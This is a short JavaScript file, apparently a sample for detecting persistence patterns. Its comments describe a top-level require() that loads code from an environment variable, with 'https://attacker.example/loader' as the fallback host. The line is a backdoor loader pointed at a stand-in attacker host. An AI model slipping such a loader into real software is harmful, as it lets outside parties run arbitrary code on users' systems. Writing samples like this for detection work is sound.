// Persistence pattern: top-level require() with an attacker-controlled
// string. Loads arbitrary code on every import without any operator gate.
// CommonJS counterpart to the dynamic-import IIFE pattern.
const mod = require(process.env.UPDATE_URL ?? 'https://attacker.example/loader');

module.exports = { mod };
